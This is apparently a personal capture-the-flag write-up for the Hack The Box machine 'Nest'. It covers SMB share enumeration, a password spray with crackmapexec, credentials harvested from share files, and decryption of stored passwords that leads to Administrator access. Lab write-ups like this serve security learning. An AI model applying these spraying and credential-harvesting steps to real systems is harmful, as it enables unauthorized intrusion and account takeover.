# Nest

---

## Enumeration

- nmap:

```

```

### Samba

- Found 'users' share, revealed some usernames:

```
  Administrator                       D        0  Fri Aug  9 11:08:23 2019
  C.Smith                             D        0  Sun Jan 26 02:21:44 2020
  L.Frost                             D        0  Thu Aug  8 13:03:01 2019
  R.Thompson                          D        0  Thu Aug  8 13:02:50 2019
  TempUser                            D        0  Wed Aug  7 18:55:56 2019
```

- Data/Shared is open for anon access
- Found creds in welcome email template:

```
Username: TempUser
Password: welcome2019
```

- Password spray revealed this password is used by several users who forgot to change it?
- Useres `L.Frost`, `R.Thompson`, `TempUser` have same password that is `welcome2019`.

```zsh
crackmapexec smb -u usernames.txt -p passwords.txt --continue-on-success 10.10.10.178         

SMB         10.10.10.178    445    HTB-NEST         [*] Windows 6.1 Build 7601 (name:HTB-NEST) (domain:HTB-NEST) (signing:False) (SMBv1:False)
SMB         10.10.10.178    445    HTB-NEST         [-] HTB-NEST\Administrator:welcome2019 STATUS_LOGON_FAILURE 
SMB         10.10.10.178    445    HTB-NEST         [-] HTB-NEST\C.Smith:welcome2019 STATUS_LOGON_FAILURE 
SMB         10.10.10.178    445    HTB-NEST         [+] HTB-NEST\L.Frost:welcome2019 
SMB         10.10.10.178    445    HTB-NEST         [+] HTB-NEST\R.Thompson:welcome2019 
SMB         10.10.10.178    445    HTB-NEST         [+] HTB-NEST\TempUser:welcome2019
```

- Only `TempUser` has access to things, full read access to `Data` Share, mounted it:

```zsh
sudo mount -t cifs -o rw,credentials=/home/kali/CTF/HTB-CTF/Machines/Nest/creds //$IP/Data /mnt/Shared
```

- Found new creds in `Data/IT/Configs/RU Scanner`: uncrackable?

```xml
<?xml version="1.0"?>
<ConfigFile xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <Port>389</Port>
  <Username>c.smith</Username>
  <Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password>
</ConfigFile> 
```

- Users `L.Frost` and `R.Thompson` have no password on smb!!
- Found in Data share np++ history?

```xml
        <File filename="C:\windows\System32\drivers\etc\hosts" />
        <File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt" />
        <File filename="C:\Users\C.Smith\Desktop\todo.txt" />
```

```zsh
sudo mount -t cifs -o credentials=/home/kali/CTF/HTB-CTF/Machines/Nest/creds //$IP/Secure$/IT/Carl /mnt/Carl
```

- Found vb project, Moved it to my windows machine and let it decreypt the password for me, `xRxRxPANCAK3SxRxRx`.
- Worked on user C.Smith on smb!

```zsh
crackmapexec smb -u 'C.Smith' -p 'xRxRxPANCAK3SxRxRx' --shares $IP         

SMB         10.10.10.178    445    HTB-NEST         [*] Windows 6.1 Build 7601 (name:HTB-NEST) (domain:HTB-NEST) (signing:False) (SMBv1:False)
SMB         10.10.10.178    445    HTB-NEST         [+] HTB-NEST\C.Smith:xRxRxPANCAK3SxRxRx 
SMB         10.10.10.178    445    HTB-NEST         [+] Enumerated shares
SMB         10.10.10.178    445    HTB-NEST         Share           Permissions     Remark
SMB         10.10.10.178    445    HTB-NEST         -----           -----------     ------
SMB         10.10.10.178    445    HTB-NEST         ADMIN$                          Remote Admin
SMB         10.10.10.178    445    HTB-NEST         C$                              Default share
SMB         10.10.10.178    445    HTB-NEST         Data            READ            
SMB         10.10.10.178    445    HTB-NEST         IPC$                            Remote IPC
SMB         10.10.10.178    445    HTB-NEST         Secure$         READ            
SMB         10.10.10.178    445    HTB-NEST         Users           READ
```

- Got user flag

---

## PrivEsc

- Found that port 4386 is running the program i just found
- Enumerating SMB, found password hidden in a file using `allinfo Debug Mode Password.txt`
- Found creds in LDAP directory

```
Domain=nest.local
Port=389
BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
User=Administrator
Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
```

- Did some reverse engineering and let the program decrypt the password for me again
- password: `XtH4nkS4Pl4y1nGX`

```zsh
crackmapexec smb -u 'Administrator' -p passwords.txt --shares $IP

SMB         10.10.10.178    445    HTB-NEST         [+] HTB-NEST\Administrator:XtH4nkS4Pl4y1nGX (Pwn3d!)
```

- rooted.

---

